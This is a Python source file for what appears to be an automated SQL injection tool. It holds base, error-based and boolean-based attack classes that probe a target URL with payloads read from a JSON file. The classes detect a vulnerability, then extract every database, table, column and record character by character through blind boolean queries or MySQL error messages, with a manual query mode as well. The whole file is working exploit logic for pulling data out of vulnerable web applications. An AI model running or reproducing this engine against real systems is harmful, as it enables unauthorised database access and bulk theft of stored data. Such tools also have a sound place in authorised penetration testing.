import json
import logging
import re
import string
from typing import Union, Tuple, Iterator

import pandas
from pandas import DataFrame
from urllib.parse import quote_plus
from prettytable import PrettyTable
from requests import Session, Response

PAYLOADS = json.load(open("payloads.json"))  # Load the JSON of the mechanism.


def safe_format(provided_str, **kwargs) -> str:
    """
    A simple workaround for .format() to ignore missing keys.
    @param provided_str: The string to work on.
    @param kwargs: Keyword arguments.
    @return: The formatted string.
    """

    class SafeDict(dict):
        def __missing__(self, key):
            return '{' + key + '}'

    replacements = SafeDict(**kwargs)
    return provided_str.format_map(replacements)


class AttackException(Exception):
    """
    A custom exception used for sanity checks.
    """
    pass


class Attack:
    """
    The base Attack class, implemented by all injection types. Holds the part of the logic that is generic and used
    by all attacks.
    """

    def __init__(self, session: Session, base_url: str, is_manual: bool = False) -> None:
        """
        Attack constructor. Initializes the session, extractor queries and manual flag.
        @param session: The provided HTTP session.
        @param base_url: The URL that is used.
        @param is_manual: Is manual mode on.
        @return: None.
        """

        self.session = session
        self.base_url = base_url
        self.extractors = PAYLOADS["extractors"]
        self.is_manual = is_manual

    def run_payload(self, payload: str) -> Tuple[str, Response]:
        """
        Builds the attack URL using the payload and gets the response from the server.
        @param payload: The payload to use.
        @return: The attack URL and the server's response.
        """

        attack_url = f"{self.base_url}{quote_plus(payload)}"
        response = self.session.get(attack_url)

        return attack_url, response

    def get_query_output(self, query: str) -> any:
        """
        An abstract method. Each attack has a different method for extracting the response out of the exploit query.
        @param query: The query to extract from.
        @return:
        """

        raise NotImplementedError()

    def extract(self, field, previous_fields) -> list[str]:
        """
        Extracts fields based on previous fields. This method starts with finding the count of the field, meaning how
        many exist. Then, it extracts the data for each field, and returns all of it.
        @param field: The field that is searched.
        @param previous_fields: Previous fields that are needed to properly build the query.
        @return: A list of strings holding the extracted data.
        """

        count = None
        for get_count_base_query in self.extractors[field]["get_count"]:
            try:
                get_count_query = get_count_base_query.format(**previous_fields)
                count = int(self.get_query_output(get_count_query))
                break
            except Exception:
                continue
        else:  # No query has worked.
            return []

        for base_extract_query in self.extractors[field]["extract"]:
            try:
                results = []
                for i in range(count):
                    extract_query = base_extract_query.format(index=i, **previous_fields)
                    data = self.get_query_output(extract_query)
                    if not data:
                        break

                    results.append(data)
                else:
                    return results
            except Exception:
                continue
        return []  # No query has worked.

    def manual(self) -> Union[DataFrame, None]:
        """
        Exploit a detected vulnerability manually. Receives SQL queries as input from the user and attempts to execute
        them.
        @return: All found records.
        """

        records = []

        while True:
            manual_query = input("Enter an SQL query or 'exit': ")
            if manual_query == "exit":
                break
            try:
                output = self.get_query_output(manual_query)
                logging.critical(f"Output: {output}")
                records.append({"query": manual_query, "output": output})

            except Exception as e:
                logging.warning(f"Manual query {manual_query} created an exception!")
                logging.warning(e, exc_info=True)

        return pandas.json_normalize(records) if records else None

    def exploit(self) -> Union[DataFrame, None]:
        """
        Exploit a detected vulnerability automatically, using four nested loops. For each level an extraction is
        attempted. The order is databases, tables, columns, records and indexes. The result is the found data.
        @return: All found records.
        """

        all_records = []

        logging.info("Extracting all databases...")
        for database in self.extract("databases", {}):
            if database == "information_schema":
                continue

            logging.info(f"Extracting database {database}...")

            for table in self.extract("tables", {"db": database}):
                logging.info(f"Extracting table {table}...")

                for column in self.extract("columns", {"db": database, "tbl": table}):
                    logging.info(f"Extracting column {column}...")

                    for index, record in enumerate(
                            self.extract("records", {"db": database, "tbl": table, "col": column})
                    ):
                        all_records.append({
                            "database": database,
                            "table": table,
                            "column": column,
                            "index": index,
                            "value": record
                        })

        return pandas.json_normalize(all_records) if all_records else None


class ErrorBasedAttack(Attack):
    """
    Holds logic for error-based SQL injection.
    """

    def __init__(self, session: Session, base_url: str, is_manual: bool = False) -> None:
        """
        ErrorBasedAttack constructor. Uses the super() constructor and the relevant payloads.
        @param session: The provided HTTP session.
        @param base_url: The URL that is used.
        @param is_manual: Is manual mode on.
        @return: None.
        """

        super().__init__(session, base_url, is_manual)

        # Relevant payloads.
        error_based = PAYLOADS["attacks"]["error-based"]
        self.error_patterns = error_based["error_patterns"]
        self.injections = error_based["injections"]

        # Used when a possible query is detected.
        self.exploit_query = None

    def iterate_injections(self) -> Iterator[str]:
        """
        Iterates over the injections JSON, yielding an injection "title", "detect" and "exploit" at-a-time.
        @return: "title", "detect" and "exploit" string iterator.
        """

        for injection in self.injections:
            yield injection["title"], injection["detect"], injection["exploit"]

    def attack(self) -> Union[Tuple[DataFrame, PrettyTable], None]:
        """
        Run the error-based attack. Start with detecting possible injections, then try to exploit (extract all data from
        the server) or run manual queries, using a found injection.
        @return: A pandas DataFrame containing all the collected data from the server, and a PrettyTable object
        with the vulnerable injection we used. If attack didn't find any injection, returns None.
        """

        for title, detect_query, exploit_query in self.iterate_injections():
            logging.info(f"Attempting error-based injection {title} ({detect_query})")
            attack_url, response = self.run_payload(detect_query)
            if not self.get_mysql_error(response=response):
                continue

            logging.critical(f"Detected error-based injection {title} with URL {attack_url}")
            self.exploit_query = exploit_query

            if self.is_manual:
                records = self.manual()
            else:
                records = self.exploit()

            if records is None and not self.is_manual:
                continue

            logging.info("Finished Error-based attack successfully!")

            used_payload = PrettyTable()
            used_payload.field_names = ["Title", "Payload"]
            used_payload.add_row([title, detect_query])

            return records, used_payload

        logging.info("Couldn't find Error-based attacks!")
        return None

    def get_query_output(self, query: str) -> Union[None, str]:
        """
        Execute a given target query with the error-based method, using the saved exploit_query, and extract the output
        of the query from the error message returned by the server.
        @param query: The target query.
        @return: The output of the query, or None in case of failure.
        """

        full_exploit_query = self.exploit_query.format(query=query)
        _, response = self.run_payload(full_exploit_query)
        return self.get_mysql_error(response)

    def get_mysql_error(self, response: Response) -> Union[None, str]:
        """
        Given an HTTP response object which might contain a MySQL error injected with a query output, extract the query
        output from it.
        @param response: HTTP response object.
        @return: The query output, or None in case the response isn't an error.
        """

        # Extracted content from response object.
        content = response.content.decode().lower()

        for error in self.error_patterns:
            match = re.search(error, content)
            if match:
                return match.group("error_response")
        return None


class BooleanBasedAttack(Attack):
    """
    Holds logic for boolean-based SQL injection.
    """

    def __init__(self, session: Session, base_url: str, is_manual: bool = False) -> None:
        """
        BooleanBasedAttack constructor. Uses the super() constructor and the relevant payloads.
        @param session: The provided HTTP session.
        @param base_url: The URL that is used.
        @param is_manual: Is manual mode on.
        @return: None.
        """

        super().__init__(session, base_url, is_manual)

        # Relevant payloads.
        boolean_based = PAYLOADS["attacks"]["boolean-based"]
        self.injections = boolean_based["injections"]
        self.blind_extractors = boolean_based["blind-extractors"]

        # Status flags.
        self.detected_status_true = None
        self.detected_status_false = None

        # Used when a possible query is detected.
        self.exploit_query = None

    def iterate_injections(self) -> Iterator[str]:
        """
        Iterates over the injections JSON, yielding an injection "title", "detect_true", "detect_false" and "exploit"
        at-a-time.
        @return: "title", "detect_true", "detect_false" and "exploit" string iterator.
        """

        for injection in self.injections:
            yield injection["title"], injection["detect_true"], injection["detect_false"], injection["exploit"]

    def run_boolean_query(self, boolean_query: str) -> bool:
        """
        The method accepts a boolean query, plants it inside the detected vulnerability and looks at the HTTP status
        code. If the status code matches the one from the detection phase of a “True” query, we return True, if it
        matches the “False” status code we return False, otherwise we throw an error.
        @param boolean_query: The boolean query to run.
        @return: True or False according to result.
        """

        if not self.exploit_query:
            raise AttackException("Did not get an exploit query for boolean based attack!")

        if not self.detected_status_false or not self.detected_status_true:
            raise AttackException("Have not detected HTTP statuses for boolean queries yet!")

        full_exploit_query = self.exploit_query.format(query=boolean_query)
        attack_url, response = self.run_payload(full_exploit_query)
        if response.status_code == self.detected_status_true:
            return True
        elif response.status_code == self.detected_status_false:
            return False

        raise AttackException(f"Unable to detect whether boolean query {boolean_query} is true or false!")

    def get_single_character_from_output(self, comparison_query: str, index: int) -> str:
        """
        The method accepts an index and a comparison query, and attempts to resolve the character at the given index
        from the output of the target query.
        @param comparison_query: The comparison query.
        @param index: The index of the character that is needed.
        @return: The resulting character.
        """

        for char in string.printable:
            boolean_query = comparison_query.format(index=index + 1, char=ord(char))
            if self.run_boolean_query(boolean_query):  # Is the character correct?
                logging.info(f"Got character: {char}")
                return char

        raise AttackException(f"Could not determine character at index {index} for query {comparison_query}")

    def get_all_query_output_characters(self, comparison_query: str, output_length: int) -> str:
        """
        The method accepts a comparison query and the output length of the original query, and returns the entire target
        query output.
        @param comparison_query: The comparison query.
        @param output_length: The length of the target query output.
        @return: The target query output.
        """

        output = ""

        for index in range(output_length):
            character = self.get_single_character_from_output(comparison_query, index)
            output += character

        return output

    def get_query_output_from_blind_extractors(self, blind_extractors: list[str], inner_query: str, expected_output_length: int) -> str:
        """
        The method extracts the output of inner_query (the target query) using a supplied list of blind_extractors and
        the provided excepted_output_length.
        @param blind_extractors: The blind extractors.
        @param inner_query: The inner query.
        @param expected_output_length: The expected output length.
        @return: The output of inner_query.
        """

        for blind_extractor in blind_extractors:
            try:
                comparison_query = safe_format(blind_extractor, query=inner_query)
                return self.get_all_query_output_characters(comparison_query, expected_output_length)
            except Exception as e:
                logging.warning(e, exc_info=True)
                continue

        raise AttackException(f"Could not get query output for {inner_query}")

    def get_query_output(self, query: str) -> Union[str, None]:
        """
        Execute a given target query with the boolean-based method, using the saved exploit_query.
        @param query: The target query.
        @return: The output of the query, or None in case of failure.
        """

        try:
            output_length_of_length = int(
                self.get_query_output_from_blind_extractors(
                    blind_extractors=self.blind_extractors["length_of_length"],
                    inner_query=query,
                    expected_output_length=1
                )
            )

            output_length = int(
                self.get_query_output_from_blind_extractors(
                    blind_extractors=self.blind_extractors["length"],
                    inner_query=query,
                    expected_output_length=output_length_of_length
                )
            )

            output = self.get_query_output_from_blind_extractors(
                blind_extractors=self.blind_extractors["characters"],
                inner_query=query,
                expected_output_length=output_length
            )

            return output

        except Exception:
            return None

    def attack(self) -> Union[Tuple[DataFrame, PrettyTable], None]:
        """
        Run the boolean-based attack. Start with detecting possible injections, then try to exploit (extract all data
        from the server) or run manual queries, using a found injection.
        @return: A pandas DataFrame containing all the collected data from the server, and a PrettyTable object
        with the vulnerable injection we used. If attack didn't find any injection, returns None.
        """

        for title, detect_true, detect_false, exploit_query in self.iterate_injections():
            logging.info(f"Attempting boolean-based injection {title}")

            attack_url_true, response_true = self.run_payload(detect_true)
            attack_url_false, response_false = self.run_payload(detect_false)

            # If same status code, we can't leak a success bit.
            if response_true.status_code == response_false.status_code:
                continue

            logging.critical(f"Detected error-based injection {title}!")
            logging.info(f"Got status code {response_true.status_code} for True query URL {attack_url_true}")
            logging.info(f"Got status code {response_false.status_code} for False query URL {attack_url_false}")

            self.detected_status_true = response_true.status_code
            self.detected_status_false = response_false.status_code
            self.exploit_query = exploit_query

            if self.is_manual:
                records = self.manual()
            else:
                records = self.exploit()

            if records is None and not self.is_manual:
                continue

            logging.info("Finished Boolean-based attack successfully!")

            used_payload = PrettyTable()
            used_payload.field_names = ["Title", "Payload TRUE", "Payload FALSE"]
            used_payload.add_row([title, detect_true, detect_false])

            return records, used_payload

        logging.info("Couldn't find Boolean-based attacks!")
        return None
